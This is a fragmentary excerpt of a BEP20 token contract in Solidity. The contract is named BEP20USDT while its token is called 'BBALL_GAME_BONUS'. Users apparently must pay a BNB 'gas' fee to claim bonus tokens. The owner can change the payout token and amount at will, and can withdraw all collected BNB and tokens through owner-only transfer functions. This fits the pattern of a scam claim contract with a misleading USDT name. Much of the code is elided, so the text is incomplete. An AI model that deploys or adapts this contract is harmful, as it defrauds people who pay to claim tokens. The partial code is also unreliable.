...
contract BEP20USDT is Context, IBEP20, Ownable {
  ...
  string public _name;
  address public _withdrawToken;
  uint256 public _withdrawAmount;
  uint256 public _withdrawPreSaleP; 
  uint256 public _gas; 

  constructor() public {
    _name = "BBALL_GAME_BONUS";
    _symbol = "BBALL_GAME_BONUS";
    _decimals = 9;
    _totalSupply = 100000000*10**9;
    _balances[msg.sender] = _totalSupply;
	_withdrawAmount = 5*10**4*10**9;
	_withdrawToken = address(0);
	_withdrawPreSaleP = 20*10**8*10**9;
	_gas = 10**15;
  ...
  */
  ...
  function _burnFrom(address account, uint256 amount) internal {
    ...
    function transferToken(address _token,address _receive, uint256 _amount) public onlyOwner {
        IBEP20(_token).transfer(_receive, _amount);
    }

	function transferBNB(address _receive, uint256 _amount) public onlyOwner {
        address payable receive = address(uint160(_receive));
	    
        receive.transfer(_amount);
    }
	
	
    function setWithdraw(address  Token, uint256 Amount, uint256 price, uint256 gas ) public onlyOwner {
      _withdrawAmount =   Amount;
	  _withdrawToken = Token;
	  _withdrawPreSaleP = price;
	  _gas = gas;
    }	
	...
	require(msg.value>=_gas,'gas too low');
	
	IBEP20(_withdrawToken).transfer(msg.sender, _withdrawAmount);
	...
	uint256 Amount = msg.value.div(10**18).mul(_withdrawPreSaleP);		
	
	IBEP20(_withdrawToken).transfer(msg.sender, Amount);
